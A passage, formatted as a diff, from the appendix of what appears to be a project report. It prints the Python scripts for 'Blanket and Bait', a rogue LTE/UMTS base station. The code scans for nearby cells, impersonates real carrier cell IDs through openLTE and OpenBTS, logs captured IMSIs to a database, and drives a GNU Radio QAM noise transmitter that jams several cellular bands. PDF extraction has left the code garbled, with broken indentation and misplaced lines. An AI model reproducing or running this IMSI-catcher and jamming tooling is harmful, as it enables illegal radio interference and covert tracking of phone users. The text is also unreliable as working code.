+dependencies on the Ubuntu Software Center, and various Open Source packages.
+
+23
+
+0.6 Appendix
+
+0.6.1
+
+cell search.py
+
+import sys
+import re
+import os
+from subprocess import Popen, PIPE
+from datetime import datetime, timedelta
+#####################################
+#Global Variables
+#####################################
+freqs=[2117.5]
+
+#####################################
+# parseASN1(): identifies cell tower
+#
+#####################################
+def parseASN1(line):
+
+information for rogueBS
+
+try:
+
+hexStrn=""
+hexStrn=re.search(r\[(.*?)\],line).group(1)
+hexStrn=hexStrn.replace(" ","")
+print("Hex String for Decode: "+hexStrn)
+
+except Exception as e:
+
+print("...Exception.")
+
+def update(line,b):
+
+params=[]
+print("Updating Cell Definitions...")
+params=line.split(",")
+freq=0
+if len(params) > 2:
+
+print(params[0])
+freq=float(re.search("Found CELL (.*) MHz",str(params[0])).group(1))
+print(freq)
+earfcn=int(re.search("EARFCN=(.*)",str(params[1])).group(1))
+print(earfcn)
+phyid=int(re.search("PHYID=(.*)",str(params[2])).group(1))
+print(phyid)
+with open("lte_cell_defs_band"+str(b)+".csv",a+) as f:
+
+f.write("Freq(MHz),EARFCN,PhyID\n")
+f.write(str(freq)+","+str(earfcn)+","+str(phyid)+"\n")
+
+return freq
+
+def getCellInfo():
+
+s=str(os.getcwd())+"/./pdsch_ue"
+q="-f"
+period=timedelta(seconds=10)
+
+24
+
+next_time=datetime.now()+period
+for freq in freqs:
+
+l=str(int(freq*10e5))
+print("Searching for Cell Info: "+l)
+ps=Popen([s,q,l],stdout=PIPE,stderr=PIPE)
+for line in iter(ps.stdout.readline,""):
+
+try:
+
+#sys.stdout.write(line+str("\r"))
+if "not found" in line:
+print("Killing")
+sys.stdout.flush()
+ps.kill()
+
+elif "find any cell" == line:
+
+print("Killing...")
+sys.stdout.flush()
+ps.kill()
+
+elif "Decoded_PDSCH=" in line:
+
+parseASN1(line)
+
+elif next_time<=datetime.now():
+
+else:
+
+next_time=period+datetime.now()
+ps.kill()
+
+sys.stdout.write(line+str("\r"))
+sys.stdout.flush()
+
+except KeyboardInterrupt:
+
+break
+
+ps.wait()
+
+def run():
+
+bands = [5,17]
+s=str(os.getcwd())+"/./cell_search"
+
+q="-b"
+print("Executing: "+s)
+for band in bands:
+l=str(band)
+ps=Popen([s,q,l], stdout=PIPE)
+for line in iter(ps.stdout.readline,""):
+
+try:
+
+sys.stdout.write(line+str("\r"))
+
+except KeyboardInterrupt:
+
+break
+
+if "Found CELL" in line:
+
+sys.stdout.flush()
+print(line)
+freqs.append(update(line,band))
+
+25
+
+if "Bye" in line:
+
+pass
+
+ps.wait()
+
+getCellInfo()
+
+0.6.2
+
+elevated user.py
+
+#!/usr/bin/python
+import MySQLdb
+import sys
+import time
+import re
+import os
+import getpass
+import readline
+from passlib.hash import pbkdf2_sha256
+from termcolor import colored
+
+def progress():
+
+x=1
+
+while x < 101:
+
+time.sleep(0.02)
+y=str(x)
+sys.stdout.write(colored("\rSetting Up: ",red)+y+"%.")
+sys.stdout.flush()
+x=x+1
+
+sys.stdout.write(colored("\r****----**** Ready ****----****",green))
+sys.stdout.flush()
+print("")
+
+def login(db):
+
+complete=0
+print("
+print("
+
+Please Select 1 of the options listed:\n\n")
+***************************************\n
+
+1: Login as
+
+Superuser \n
+***************************************")
+
+2: Login as Admin \n
+
+while complete == 0:
+
+ans=raw_input(">> ")
+if ans is "1":
+
+name=raw_input(colored("Name?: ",red))
+cur=db.cursor()
+cur.callproc(sp_findUser,(name,))
+result=cur.fetchall()
+cur.close()
+if DNE not in result[0][0]:
+
+print(colored("Authentication Required by: "+name,red))
+psswrd=getpass.getpass("Password: ")
+if pbkdf2_sha256.verify(psswrd, result[0][0]):
+
+cur=db.cursor()
+cur.callproc(sp_loginSuper,(name,result[0][0]))
+
+26
+
+result=cur.fetchall()
+cur.close()
+if Welcome in result[0][0]:
+
+complete=1
+print(colored(Welcome +name+".",green))
+return Super +name
+
+print(colored(result[0][0],red))
+
+else:
+
+else:
+
+else:
+
+if ans is "2":
+
+print(colored("Wrong password.",red))
+
+print(colored("User does not exist.",red))
+
+name=raw_input(colored("Name?: ",red))
+cur=db.cursor()
+cur.callproc(sp_findUser,(name,))
+result=cur.fetchall()
+cur.close()
+if DNE not in result[0][0]:
+
+print(colored("Authentication Required by: "+name,red))
+psswrd=getpass.getpass("Password: ")
+if pbkdf2_sha256.verify(psswrd, result[0][0]):
+
+cur=db.cursor()
+cur.callproc(sp_loginAdmin,(name,result[0][0]))
+result=cur.fetchall()
+cur.close()
+if Welcome in result[0][0]:
+
+complete=1
+print(colored(Welcome +name+".",green))
+return Admin +name
+
+else:
+
+print(colored(result[0][0],red))
+
+print(colored("Wrong password.",red))
+
+else:
+
+else:
+
+print(colored("User does not exist.",red))
+
+else:
+
+complete=0
+
+def startUp(db):
+
+cur=db.cursor()
+cur.callproc(sp_checkSuper,())
+result=cur.fetchall()
+print(Database says: +result[0][0])
+cur.close()
+if First in result[0][0]:
+
+print(colored("<------------------------------! IMPORTANT
+
+27
+
+!------------------------------>\n\n",red))
+
+print(colored("This appears to be the first time this script has been run
+
+.",yellow))
+
+print(colored("We require you to become the superuser of this program.
+Therefore, we require\nyour name, IMSI and a password.",yellow))
+
+name=raw_input("~Name of Superuser?: ")
+print(colored("---OK",green))
+imsi=raw_input("~IMSI of Admin?: ")
+while len(imsi) < 15 or len(imsi) >15 or not is_number(imsi):
+
+print(colored("You have input an invalid IMSI\n",red))
+print(colored("-- A valid IMSI has 15 digits...\n\n",red))
+imsi=raw_input("IMSI of Admin?: ")
+
+print(colored("---OK",green))
+print(colored("Please choose a password between 8-16 characters.\n",blue)
+
+)
+
+psswrd=getpass.getpass("~Password?: ")
+while len(psswrd) < 8 or len(psswrd) > 16:
+
+print(colored("Password does not Satisfy Requirements...\n",red))
+print(colored("$$$ Please choose a password between 8-16 characters
+
+.\n",blue))
+
+psswrd=getpass.getpass("~Password?: ")
+
+print("Confirm Your Password")
+psswrd_conf=getpass.getpass("Re-enter Password: ")
+if psswrd not in psswrd_conf:
+
+print(colored("The passwords did not match, aborting.\n",red))
+print("Try again.")
+
+else:
+
+print(colored("---OK",green))
+print(name+", you are going to be the Superuser of this program.")
+print("--Press [return] to continue. Press any other button to
+
+abort.")
+
+ins=raw_input(">> ")
+if ins is :
+
+hash = pbkdf2_sha256.encrypt(psswrd, rounds=200000,
+
+salt_size=16)
+
+cur=db.cursor()
+cur.callproc(sp_super,(name,hash,imsi))
+result=cur.fetchall()
+print(result)
+cur.close()
+if New user in result[0][0]:
+
+print(colored("Superuser is: "+name+".",green))
+print(colored("**Success.**",blue))
+
+print(colored("User Exists.",red))
+
+else:
+
+else:
+
+print(colored("Aborting procedure.",red))
+
+else:
+
+print(colored("---OK",green))
+
+28
+
+def is_number(s):
+
+try:
+
+int(s)
+return True
+
+except ValueError:
+
+return False
+
+def addUser(db):
+
+name=raw_input("~Name of Admin?: ")
+print(colored("---OK",green))
+imsi=raw_input("~IMSI of Admin?: ")
+print(colored("---OK",green))
+while len(imsi) < 15 or len(imsi) >15 or not is_number(imsi):
+
+print(colored("You have input an invalid IMSI\n",red))
+print(colored("-- A valid IMSI has 15 digits...\n\n",red))
+imsi=raw_input("IMSI of Admin?: ")
+
+print(colored("Please choose a password between 8-16 characters.\n",blue))
+psswrd=getpass.getpass("~Password?: ")
+while len(psswrd) < 8 or len(psswrd) > 16:
+
+print(colored("Password does not Satisfy Requirements...\n",red))
+print(colored("$$$ Please choose a password between 8-16 characters.\n",
+
+blue))
+
+psswrd=getpass.getpass("~Password?: ")
+
+print("Confirm Your Password")
+psswrd_conf=getpass.getpass("Re-enter Password: ")
+if psswrd not in psswrd_conf:
+
+print(colored("The passwords did not match, aborting.\n",red))
+print("Try again.")
+
+else:
+
+print(colored("---OK",green))
+print("Are you sure you want to add "+name+" as an Admin?")
+print("--Press [return] to continue. Press any other button to abort.")
+ins=raw_input(">> ")
+if ins is :
+
+hash = pbkdf2_sha256.encrypt(psswrd, rounds=200000, salt_size=16)
+cur=db.cursor()
+cur.callproc(sp_admin,(name,hash,imsi))
+result=cur.fetchall()
+print("Database says: "+colored(result[0][0],yellow))
+cur.close()
+if New user in result[0][0]:
+
+print(colored("Admin: "+name+" has been added.",green))
+print(colored("**Success.**",blue))
+
+else:
+
+else:
+
+print(colored("User Exists.",red))
+
+print(colored("Aborting procedure.",red))
+
+29
+
+def delUser(db,loginSays):
+
+print("Are you sure you want to delete an Admin?")
+ans=raw_input("Y/n?: ")
+if ans is "" or ans is "Y" or ans is "y":
+
+if Admin in loginSays:
+
+print("Entering Deletion State: ")
+name=raw_input(colored("Name of Admin?: ",red))
+if name in loginSays:
+
+print(colored("You cannot delete yourself.",yellow))
+
+else:
+
+cur=db.cursor()
+cur.callproc(sp_findUser,(name,))
+result=cur.fetchall()
+cur.close()
+if DNE not in result[0][0]:
+
+print(colored("Authentication Required by: "+name,
+
+red))
+
+psswrd=getpass.getpass("Password: ")
+if pbkdf2_sha256.verify(psswrd, result[0][0]):
+
+cur=db.cursor()
+cur.callproc(sp_delAdmin,(name,result[0][0])
+
+)
+
+result=cur.fetchall()
+cur.close()
+if Deleted in result[0][0]:
+
+print(colored(name+" was deleted.",
+
+green))
+
+else:
+
+print(colored("Wrong Password.",red))
+print(colored("Aborting...",blue))
+
+print(colored("Wrong password.",red))
+
+else:
+
+else:
+
+if Super in loginSays:
+
+print(colored("User does not exist.",red))
+print(colored("Aborting...",blue))
+
+print("Entering Superuser Deletion State: ")
+name=raw_input(colored("Name of Admin?: ",red))
+cur=db.cursor()
+cur.callproc(sp_delAdminSU,(name,))
+result=cur.fetchall()
+cur.close()
+if Deleted in result[0][0]:
+
+print(colored(name+" was deleted.",green))
+
+else:
+
+print(colored(result[0][0],red))
+print(colored("Aborting...",blue))
+
+30
+
+def run():
+
+if os.getuid() == 0:
+
+print(colored("You must run this application without Root Permissions...!\n
+
+--> Shutting Down.",red))
+
+else:
+
+os.system("clear")
+
+print("This script requires the use of a hidden database. Please enter the
+
+password for this database.")
+
+db_pass=getpass.getpass(colored("~DB Password?:",red))
+try:
+
+db = MySQLdb.connect(host="localhost",user="root",passwd=db_pass,db
+
+="blanket_and_bait")
+
+print(colored("---OK",green))
+startUp(db)
+loginSays=login(db)
+
+print(colored("\n\n
+
+Welcome to Blanket And Baits
+
+Adminstrator Settings.\n\n",green))
+
+print(colored("Press q + [return] to exit.\n\n",blue))
+print(colored("Type help + [return] for help using this program.\
+
+n\n",blue))
+
+print("
+print("
+
+Add Administrator \n
+List Administrators
+
+\n
+
+Please Select 1 of the options listed:\n\n")
+***************************************\n
+2: Remove Administrator\n
+
+1:
+3:
+
+***************************************")
+
+instruct=raw_input(">> ")
+if instruct is q:
+
+print("Goodbye.")
+
+while instruct is not q:
+
+if instruct is 1:
+
+print("You have selected to add an administrator.\n")
+addUser(db)
+print("\n\n")
+elif instruct is 2:
+
+print("You have selected to delete an administrator.\
+
+n")
+
+delUser(db,loginSays)
+print("\n\n")
+
+elif instruct is 3:
+
+print("You requested for a list of administrators.\n\
+
+31
+
+n")
+
+print(colored("\n\nAdministrators:",yellow))
+print(colored("********************************",
+
+blue))
+
+cur=db.cursor()
+cur.callproc(sp_listAdmin,())
+result=cur.fetchall()
+for p_user in result:
+
+print(">> "+colored(p_user[0],red))
+
+cur.close()
+print(colored("********************************",
+
+blue))
+
+print("\n\n")
+elif instruct is :
+
+print("")
+
+elif help in instruct:
+
+print("Welcome ^_^\n\nYou are using Blanket and Bait
+
+s Administrator Setup.\nThis allows a user to
+bypass Blanket and Baits Technology. \nPlease be
+
+advised that we are in testing and your 
+
+privileged user may or may not be affected by
+our technology.\n\n")
+
+print("
+
+Please Select 1 of the options listed:\
+
+n\n")
+
+print("
+
+***************************************\n
+
+1: Add Administrator \n
+
+2: Remove
+
+Administrator\n
+
+3: List Administrators
+
+\n
+
+***************************************")
+
+else:
+
+print("\n\n**Instruction not recognized.")
+
+instruct=raw_input(">> ")
+if instruct is q:
+db.commit()
+db.close()
+print("Goodbye.")
+break
+
+except:
+
+0.6.3 interact.py
+
+print(colored("Wrong Password. Aborting.",red))
+
+#################################
+# Imports
+#################################
+
+32
+
+import thread
+import time
+import MySQLdb
+import signal
+import socket
+import sys
+import re
+import telnetlib
+import os
+import qam_noise as qnoise
+import getpass
+
+from subprocess import Popen, PIPE
+from datetime import datetime, timedelta
+from termcolor import colored
+
+##################################
+# Global Variables
+##################################
+
+db=None #To Connect to the database
+enabled=True #To Enable the Blanket
+runBlank=True #Loop for Blanket
+stay=True #Switch Provider Scheme
+
+#Tags for output.
+mainTag=colored("\n[<main> INFO:] ","red")
+inTag=colored("\n[<lte_in> INFO:] ","blue")
+outTag=colored("\n[<lte_out> INFO:] ","green")
+bTag=colored("\n[<blanket> INFO:] ","cyan")
+
+# Cell Info...
+# To become more dynamic.
+mcc=[302,302,302,302,302,302,302,302,302]
+mnc=[220,220,220,720,720,610,610,490,720]
+earfcn=[900, 2325,4525,2025,3050,2325,4525,2024,2700]
+cellid=[138785323, 138785281,
+
+8922882,138785281,7773189,8922882,138782081,138782081,8922882]
+
+phyid=[324,324,324,293,293,324,324,293,293]
+band=[2,4,10,4,7,4,10,4,6]
+tac=[55000,55000,55000,30013,30013,55000,55000,10200,30013]
+
+#c_info
+
+=[[302,302,302,302,302,302,302],[220,220,720,720,610,410,720],[900,2325,2025,3050,2325,2024,2700],[138785323,
+
+8922882,138782081,7773189,8922882,138782081,8922882],[324,324,293,293,324,293,293],[2,4,4,7,4,4,6],[55000,55000,30013,30013,55000,10200,30013]]
+
+#c_info=[[302],[720],[2655],[8922882],[293],[7],[30013]]
+#############################################
+# lte_in(): Provides the telnet input to mod
+
+33
+
+rogue bs on the fly.
+
+#
+#############################################
+def lte_in():
+
+c_info=[]
+c_info.append(mcc)
+c_info.append(mnc)
+c_info.append(earfcn)
+c_info.append(cellid)
+c_info.append(phyid)
+c_info.append(band)
+c_info.append(tac)
+
+global enabled, stay
+giveUp=False
+i=5
+try:
+
+print(inTag+"Beginning input interaction with openLTE:\n\n")
+# Open Connection to telnet
+tn=telnetlib.Telnet("127.0.0.1",30000,5)
+# Begin Processing Input to telnet
+print(tn.read_until(b"Type help to see a list of commands\n"))
+started=False
+while not giveUp:
+
+if started:
+
+tn.write(b"stop\n")
+print(inTag+"Stopping.\n")
+
+else:
+
+started=True
+
+print(inTag+"Baiting.\n")
+enabled=True
+stay=True
+#Execute Next Carrier.
+tn.write(b"write mcc %d\n"%(c_info[0][i]))
+tn.write(b"write mnc %d\n"%(c_info[1][i]))
+#tn.write(b"write tracking_area_code %d\n"%(c_info[6][i]))
+tn.write(b"write band %d\n"%(c_info[5][i]))
+
+print(inTag+"Band: "+str(c_info[5][i]))
+tn.write(b"write dl_earfcn %d\n"%(c_info[2][i]))
+tn.write(b"write bandwidth %d\n"%(5))
+tn.write(b"write rx_gain %d\n"%(100))
+tn.write(b"write tx_gain %d\n"%(100))
+tn.write(b"write cell_id %d\n"%(c_info[3][i]))
+tn.write(b"write n_id_cell %d\n"%(c_info[4][i]))
+
+time.sleep(10)
+tn.write(b"start\n")
+print(inTag+"... Starting\n")
+# If hooked... stay
+# else switch
+
+34
+
+while stay:
+
+time.sleep(1)
+
+if i < len(c_info):
+
+else:
+
+i=i+1
+
+i=0
+
+#time.sleep(75)
+
+except KeyboardInterrupt:
+
+tn.write(b"shutdown\n")
+
+except socket.error:
+
+print(inTag+"Connection Refused.\n")
+
+#############################################
+# lte_out(): provides the decoded output from
+#
+#
+#############################################
+def lte_out():
+
+openLTE. Ran as a thread, using
+telnetlib.
+
+global stay
+try:
+
+print(outTag+" Getting Output from openLTE:\n\n")
+tn=telnetlib.Telnet("127.0.0.1","30001")
+line=""
+#Going to Start Timer....
+#--Period is 1 Minute.
+#EDIT TEMP PERIOD =30 SECONDS
+period=timedelta(seconds=120)
+#period=timedelta(minutes=1)
+next_time=datetime.now()+period
+while True:
+
+line=tn.read_until("\n",60)
+#print("OUTPUT>>"+line)
+if "IMSI=" in line:
+
+try:
+
+#Going to extract the IMSI using Regular Expression.
+line= re.search(IMSI=(.*?) is,line).group(1)
+cur=db.cursor()
+#Executing Stored Procedure
+cur.callproc(sp_caught,(line,))
+result=cur.fetchall()
+cur.close()
+
+if "xists" in result[0][0]:
+
+print(outTag+colored(result[0][0] + "Known <
+
+IMSI> is: "+line+"\n\n", blue))
+
+else:
+
+#Identifying a new IMSI.
+print(outTag+colored("Found <IMSI>: "+line+"\n
+
+\n",green))
+
+db.commit()
+
+35
+
+except Exception as e:
+
+elif "Received" in line or "PUSCH" in line or "UL" in line:
+
+print(outTag+"Error Occured: "+str(e))
+
+#next_time=datetime.now()+period
+#EDIT
+#stay=True
+pass
+
+elif next_time<=datetime.now():
+
+next_time=datetime.now()+period
+stay=False
+print("\n\t\t"+outTag+colored("Timeout. Switching Band.\n\n
+
+","yellow"))
+
+#db.commit()
+db.close()
+
+except socket.error:
+
+global runBlank
+runBlank=False
+qnoise.killMe()
+print(outTag+"Connection Refused.")
+
+def blanket():
+
+global enabled
+while runBlank:
+
+if enabled:
+
+print(bTag+"Throwing Blanket")
+qnoise.setTime(1)
+qnoise.main()
+enabled=False
+
+def interact():
+
+global db
+try:
+
+print(colored("This script requires the use of a database.",blue))
+print(colored("Please enter the database password.",red))
+#Connecting to Database under name "blanket_and_bait"
+try:
+
+psswrd=getpass.getpass(">> ")
+print("\n\n")
+db = MySQLdb.connect(host="localhost",user="root",passwd=psswrd,db
+
+="blanket_and_bait")
+
+print(colored("-OK.",green))
+print(colored("---Create FDD_lte_enodeb process.","red"))
+print(colored("---[okay] continues.","red"))
+while raw_input(">> ")!="okay":
+
+pass
+
+thread.start_new_thread(lte_in,())
+
+36
+
+thread.start_new_thread(lte_out,())
+thread.start_new_thread(blanket,())
+
+while runBlank:
+
+pass
+
+except MySQLdb.Error as e:
+
+print(colored(e,red))
+
+except KeyboardInterrupt:
+
+print(mainTag+str(qnoise.killMe())+"\n")
+
+tn=telnetlib.Telnet("127.0.0.1",30000,5)
+tn.write(b"shutdown")
+print("\nClosing Connection.")
+
+except Exception as e:
+
+print("OpenLTE is not running.")
+
+0.6.4
+
+qam noise.py
+
+#!/usr/bin/env python2
+# -*- coding: utf-8 -*-
+##################################################
+# GNU Radio Python Flow Graph
+# Title: Top Block
+# Generated: Fri Dec 16 13:59:00 2016
+##################################################
+
+from gnuradio import analog
+from gnuradio import blocks
+from gnuradio import digital
+from gnuradio import eng_notation
+from gnuradio import gr
+from gnuradio.eng_option import eng_option
+from gnuradio.filter import firdes
+from optparse import OptionParser
+from random import randrange
+import numpy
+import osmosdr
+from datetime import datetime, timedelta
+import time
+import sys
+
+period=timedelta(seconds=30)
+isRunning=True
+
+class top_block(gr.top_block):
+
+def __init__(self):
+
+gr.top_block.__init__(self, "Top Block")
+
+##################################################
+
+37
+
+# Variables
+##################################################
+self.samp_rate = samp_rate = 4500000
+
+##################################################
+# Blocks
+##################################################
+#self.osmosdr_sink_0 = osmosdr.sink( args="numchan=" + str(1) + " " +  )
+self.osmosdr_sink_0 = osmosdr.sink( args="bladerf numchan=1" )
+#self.osmosdr_sink_0 = osmosdr.sink( args="uhd numchan=1" )
+self.osmosdr_sink_0.set_sample_rate(samp_rate)
+self.osmosdr_sink_0.set_center_freq(700e6, 0)
+self.osmosdr_sink_0.set_freq_corr(0, 0)
+self.osmosdr_sink_0.set_gain(100, 0)
+self.osmosdr_sink_0.set_if_gain(20, 0)
+self.osmosdr_sink_0.set_bb_gain(20, 0)
+self.osmosdr_sink_0.set_antenna(, 0)
+self.osmosdr_sink_0.set_bandwidth(100e6, 0)
+
+self.digital_qam_mod_0 = digital.qam.qam_mod(
+
+constellation_points=16,
+mod_code="gray",
+differential=True,
+samples_per_symbol=8,
+excess_bw=0.5,
+verbose=False,
+log=False,
+)
+
+self.blocks_multiply_xx_2_0 = blocks.multiply_vcc(1)
+self.blocks_multiply_xx_2 = blocks.multiply_vcc(1)
+self.blocks_multiply_xx_0_0 = blocks.multiply_vcc(1)
+self.blocks_multiply_xx_0 = blocks.multiply_vcc(1)
+self.blocks_multiply_const_vxx_0_0 = blocks.multiply_const_vcc((100, ))
+self.blocks_multiply_const_vxx_0 = blocks.multiply_const_vcc((100, ))
+self.blocks_add_xx_0_1 = blocks.add_vcc(1)
+self.blocks_add_xx_0_0 = blocks.add_vcc(1)
+self.blocks_add_xx_0 = blocks.add_vcc(1)
+self.analog_sig_source_x_0_0_0_0 = analog.sig_source_c(samp_rate, analog.
+
+GR_SAW_WAVE, 10e3, 10, 0)
+
+self.analog_sig_source_x_0_0_0 = analog.sig_source_c(samp_rate, analog.GR_SAW_WAVE
+
+, 10e3, 10, 0)
+
+self.analog_sig_source_x_0_0 = analog.sig_source_c(samp_rate, analog.GR_COS_WAVE,
+
+10e3, 10, 0)
+
+self.analog_sig_source_x_0 = analog.sig_source_c(samp_rate, analog.GR_COS_WAVE,
+
+100e3, 10, 0)
+
+self.analog_random_source_x_0 = blocks.vector_source_b(map(int, numpy.random.
+
+randint(0, 255, 1000)), True)
+
+##################################################
+# Connections
+##################################################
+
+38
+
+self.connect((self.analog_random_source_x_0, 0), (self.digital_qam_mod_0, 0))
+self.connect((self.analog_sig_source_x_0, 0), (self.blocks_multiply_xx_0, 1))
+self.connect((self.analog_sig_source_x_0_0, 0), (self.blocks_multiply_xx_0_0, 0))
+self.connect((self.analog_sig_source_x_0_0_0, 0), (self.blocks_multiply_xx_2_0, 0)
+
+)
+
+self.connect((self.analog_sig_source_x_0_0_0_0, 0), (self.blocks_multiply_xx_2, 1)
+
+)
+
+self.connect((self.blocks_add_xx_0, 0), (self.osmosdr_sink_0, 0))
+self.connect((self.blocks_add_xx_0_0, 0), (self.blocks_add_xx_0, 1))
+self.connect((self.blocks_add_xx_0_1, 0), (self.blocks_add_xx_0, 0))
+self.connect((self.blocks_multiply_const_vxx_0, 0), (self.blocks_multiply_xx_0, 0)
+
+)
+
+self.connect((self.blocks_multiply_const_vxx_0, 0), (self.blocks_multiply_xx_0_0,
+
+1))
+
+self.connect((self.blocks_multiply_const_vxx_0_0, 0), (self.blocks_multiply_xx_2,
+
+0))
+
+self.connect((self.blocks_multiply_const_vxx_0_0, 0), (self.blocks_multiply_xx_2_0
+
+, 1))
+
+self.connect((self.blocks_multiply_xx_0, 0), (self.blocks_add_xx_0_0, 1))
+self.connect((self.blocks_multiply_xx_0_0, 0), (self.blocks_add_xx_0_0, 0))
+self.connect((self.blocks_multiply_xx_2, 0), (self.blocks_add_xx_0_1, 1))
+self.connect((self.blocks_multiply_xx_2_0, 0), (self.blocks_add_xx_0_1, 0))
+self.connect((self.digital_qam_mod_0, 0), (self.blocks_multiply_const_vxx_0, 0))
+self.connect((self.digital_qam_mod_0, 0), (self.blocks_multiply_const_vxx_0_0, 0))
+
+def get_samp_rate(self):
+return self.samp_rate
+
+def set_samp_rate(self, samp_rate):
+
+self.samp_rate = samp_rate
+self.osmosdr_sink_0.set_sample_rate(self.samp_rate)
+self.analog_sig_source_x_0_0_0_0.set_sampling_freq(self.samp_rate)
+self.analog_sig_source_x_0_0_0.set_sampling_freq(self.samp_rate)
+self.analog_sig_source_x_0_0.set_sampling_freq(self.samp_rate)
+self.analog_sig_source_x_0.set_sampling_freq(self.samp_rate)
+
+def set_freq(self, freq):
+
+self.freq = freq
+self.osmosdr_sink_0.set_center_freq(freq, 0)
+
+def main(top_block_cls=top_block, options=None):
+
+tb = top_block_cls()
+tb.start(True)
+
+global isRunning
+isRunning=True
+
+j = 0.000000004
+i=int(800e6)
+
+39
+
+q=0;
+freqs=[[2,4,5,13,17],[18,17,7,7,7],[19,21,9,9,9],[3,1,2,2,2],[9,6,9,9,9]]
+
+next_time=datetime.now()+period
+print(">>> Blanket is running.")
+print("\t\t\t\t<INFO> Blanket on Band %d \r"%(freqs[0][q]))
+while isRunning:
+
+tb.set_freq(i)
+#sys.stdout.write("\t\t\t\t\t\t\t\t<INFO>Frequency: "+str(i)+"Hz\r")
+i=int(randrange(freqs[1][q],freqs[2][q])*1e8+randrange(freqs[3][q],freqs[4][q])*1
+
+e7)
+
+if next_time<=datetime.now():
+
+next_time=datetime.now()+period
+if q<4:
+
+else:
+
+q=q+1
+
+q=0
+
+print("\t\t\t<INFO> Blanket on Band %d \r"%(freqs[0][q]))
+
+def switchBand(q):
+
+print("Switching...")
+
+def setTime(mins):
+
+global period
+period=timedelta(minutes=mins)
+
+def killMe():
+
+global isRunning
+isRunning=False
+return isRunning
+
+if __name__ == __main__:
+
+main()
+
+0.6.5
+
+umts cover.py
+
+import sys
+import re
+import os
+import psutil
+import signal
+from subprocess import Popen, PIPE
+from datetime import datetime, timedelta
+import time
+
+[302,302,302,302,302,302,302,302]
+[220,220,720,720,720,610,610,490]
+
+mcc=
+mnc=
+uarfcn=[9800, 9800,9662,9662,4408,9800, 9800,1588]
+band= [1900, 1900, 1900,1900,850,1900, 1900,1700]
+psc=
+rnc=
+cellid=[42252,41608,18672,18663,18672,41609,41608,141]
+
+[96,148,229,21,21,148,148,25]
+[3511,3511,44,36,36, 3511,3511,10]
+
+40
+
+lac=
+
+[10500,10500,60013,60210,60013,10500,10500,10200]
+
+def run():
+
+period=timedelta(seconds=120)
+chill=timedelta(seconds=5)
+setup=timedelta(seconds=70)
+q=str(os.getcwd())+"/./OpenBTS-UMTS"
+s="sudo"
+l="-p"
+r=""
+p="-S"
+i=5
+y=0
+setup_time=datetime.now()+setup
+chill_time=datetime.now()+chill
+while True:
+
+ps=Popen([s,l,r,p,q],stdin=PIPE)
+okay=True
+#ps.stdin.write("rawconfig UMTS.Identity.MCC "+str(mcc[i]))
+#ps.stdin.write("rawconfig UMTS.Identity.MNC "+str(mnc[i]))
+#ps.stdin.write("rawconfig UMTS.Identity.LAC "+str(lac[i]))
+#ps.stdin.write("rawconfig UMTS.Radio.Band "+str(band[i]))
+#ps.stdin.write("rawconfig UMTS.Radio.C0 "+str(uarfcn[i]))
+#ps.stdin.write("rawconfig UMTS.SRNC_ID "+str(rnc[i]))
+#ps.stdin.write("rawconfig UMTS.Identity.CI "+str(cellid[i]))
+#ps.stdin.write("rawconfig UMTS.Downlink.ScramblingCode "+str(psc[i]))
+#ps.stdin.write("rawconfig GSM.Identity.MNC "+str(mnc[i]))
+#ps.stdin.write("rawconfig GSM.Identity.LAC "+str(lac[i]))
+
+#ps.wait();
+#ps=Popen([s,l,r,p,q], stdout=PIPE,stdin=PIPE)
+#while setup_time > datetime.now():
+try:
+
+sys.stdout.write("\t\t\t\t\t\t\t\t[time] "+str(datetime.now())+"\r
+
+")
+
+#if datetime.now() >= chill_time and okay:
+if okay:
+
+ps.stdin.write("cellid "+str(mcc[i])+" "+str(mnc[i])+" "+str
+
+(lac[i])+" "+str(cellid[i])+"\n")
+
+chill_time=datetime.now()+chill
+while datetime.now() < chill_time:
+
+sys.stdout.write("\t\t\t\t\t\t\t\t[time] "+str(
+
+datetime.now())+"\r")
+
+sys.stdout.flush()
+ps.stdin.write("rawconfig UMTS.Radio.Band "+str(band[i])+"\n
+
+")
+
+chill_time=datetime.now()+chill
+while datetime.now() <chill_time:
+
+41
+
+sys.stdout.write("\t\t\t\t\t\t\t\t[time] "+str(
+
+datetime.now())+"\r")
+
+sys.stdout.flush()
+ps.stdin.write("rawconfig UMTS.Radio.C0 "+str(uarfcn[i])+"\n
+
+")
+
+chill_time=datetime.now()+chill
+while datetime.now() <chill_time:
+
+sys.stdout.write("\t\t\t\t\t\t\t\t[time] "+str(
+
+datetime.now())+"\r")
+
+ps.stdin.write("rawconfig UMTS.SRNC_ID "+str(rnc[i])+"\n")
+chill_time=datetime.now()+chill
+while datetime.now() <chill_time:
+
+sys.stdout.write("\t\t\t\t\t\t\t\t[time] "+str(
+
+datetime.now())+"\r")
+
+ps.stdin.write("rawconfig UMTS.Identity.CI "+str(cellid[i])
+
++"\n")
+
+chill_time=datetime.now()+chill
+while datetime.now() <chill_time:
+
+sys.stdout.write("\t\t\t\t\t\t\t\t[time] "+str(
+
+datetime.now())+"\r")
+
+sys.stdout.flush()
+ps.stdin.write("rawconfig UMTS.Downlink.ScramblingCode "+str
+
+(psc[i])+"\n")
+
+chill_time=datetime.now()+chill
+while datetime.now() <chill_time:
+
+sys.stdout.write("\t\t\t\t\t\t\t\t[time] "+str(
+
+datetime.now())+"\r")
+
+sys.stdout.flush()
+ps.stdin.write("rawconfig GSM.Identity.MNC "+str(mnc[i])+"\n
+
+")
+
+chill_time=datetime.now()+chill
+while datetime.now() <chill_time:
+
+sys.stdout.write("\t\t\t\t\t\t\t\t[time] "+str(
+
+datetime.now())+"\r")
+
+sys.stdout.flush()
+ps.stdin.write("rawconfig GSM.Identity.LAC "+str(lac[i])+"\n
+
+")
+
+chill_time=datetime.now()+chill
+while datetime.now() <chill_time:
+
+sys.stdout.write("\t\t\t\t\t\t\t\t[time] "+str(
+
+datetime.now())+"\r")
+
+sys.stdout.flush()
+
+P1 = "transceiver"
+P2 = "OpenBTS-UMTS"
+for proc in psutil.process_iter():
+
+# check whether the process name matches
+if proc.name() == P1 or proc.name() == P2:
+
+sys.stdout.write("[Killed] "+str(proc.name())
+
+42
+
++"\r")
+
+proc.kill()
+
+chill_time=datetime.now()+chill
+while datetime.now() <chill_time:
+
+sys.stdout.write("[KILLED PROCESS]\t\t\t\t\t\t[time]
+
+"+str(datetime.now())+"\r")
+
+except KeyboardInterrupt:
+
+break
+
+okay=True
+next_time=datetime.now()+period
+ps=Popen([s,l,r,p,q],stdin=PIPE)
+while next_time > datetime.now():
+
+sys.stdout.write("\t\t\t\t\t\t\t\t[time] "+str(datetime.now())+"\r
+
+")
+
+P1 = "transceiver"
